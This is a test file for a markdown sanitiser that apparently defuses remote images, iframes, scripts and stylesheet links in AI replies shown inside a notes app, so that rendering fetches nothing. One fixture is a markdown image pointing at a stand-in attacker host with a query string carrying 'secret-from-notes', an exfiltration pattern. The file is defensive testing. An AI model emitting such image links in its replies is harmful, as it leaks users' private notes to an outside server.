import { describe, expect, it } from "vitest";
import { safeMarkdown } from "../src/safe-markdown";

describe("safeMarkdown", () => {
	it("turns a remote image into a link, so drawing the reply fetches nothing", () => {
		expect(safeMarkdown("Here: ![chart](https://evil.example/c.png?d=secret-from-notes)")).toBe("Here: [chart](https://evil.example/c.png?d=secret-from-notes)");
		expect(safeMarkdown('![](http://x.test/a.png "t")')).toBe("[image](http://x.test/a.png)");
		expect(safeMarkdown("![a](//cdn.test/a.png)")).toBe("[a](//cdn.test/a.png)");
		expect(safeMarkdown("![a](<https://x.test/a b.png>)")).toBe("[a](https://x.test/a b.png)");
	});

	it("leaves vault embeds, local and data images, and ordinary links exactly as they are", () => {
		for (const ok of ["![[Attachments/photo.png]]", "![local](Attachments/photo.png)", "![d](data:image/png;base64,AAAA)", "[a link](https://example.com)", "See [[Projects/Chess Robot]] and ![[note#Section]].", "plain text with ! and [brackets]"]) {
			expect(safeMarkdown(ok)).toBe(ok);
		}
	});

	it("handles reference-style images", () => {
		const src = "![logo][l]\n\n[l]: https://x.test/logo.png";
		expect(safeMarkdown(src)).toBe("[logo][l]\n\n[l]: https://x.test/logo.png");
		const local = "![logo][l]\n\n[l]: Attachments/logo.png";
		expect(safeMarkdown(local)).toBe(local);
	});

	it("defuses HTML that would load something", () => {
		expect(safeMarkdown('<img src="https://x.test/p.gif" width="1">')).toBe("[image](https://x.test/p.gif)");
		expect(safeMarkdown("<IMG SRC=https://x.test/p.gif>")).toBe("[image](https://x.test/p.gif)");
		expect(safeMarkdown('<video poster="https://x.test/p.jpg" controls></video>')).toBe("[video](https://x.test/p.jpg)</video>");
		expect(safeMarkdown('before <iframe src="https://x.test"></iframe> after')).toBe("before *(iframe removed)* after");
		expect(safeMarkdown("<script>fetch('https://x.test')</script>")).toBe("*(script removed)*");
		expect(safeMarkdown('<link rel="stylesheet" href="https://x.test/a.css">')).toBe("*(link removed)*");
		// A local image in HTML is left alone.
		expect(safeMarkdown('<img src="Attachments/a.png">')).toBe('<img src="Attachments/a.png">');
	});

	it("does not touch code, where the same text is shown, not drawn", () => {
		const fenced = "```html\n<img src=\"https://x.test/a.png\">\n![a](https://x.test/a.png)\n```";
		expect(safeMarkdown(fenced)).toBe(fenced);
		expect(safeMarkdown("Write `![a](https://x.test/a.png)` to embed.")).toBe("Write `![a](https://x.test/a.png)` to embed.");
		// Outside the code it is still defused.
		expect(safeMarkdown("`code` and ![a](https://x.test/a.png)")).toBe("`code` and [a](https://x.test/a.png)");
		// An unfinished fence while the reply is still streaming is code to its end.
		expect(safeMarkdown("```\n![a](https://x.test/a.png)")).toBe("```\n![a](https://x.test/a.png)");
	});

	it("is the identity on text with nothing to defuse, and stable when applied twice", () => {
		const plain = "A normal answer with **bold**, a [link](https://example.com) and a list:\n- one\n- two";
		expect(safeMarkdown(plain)).toBe(plain);
		const once = safeMarkdown("![a](https://x.test/a.png) <iframe src=x></iframe>");
		expect(safeMarkdown(once)).toBe(once);
	});
});
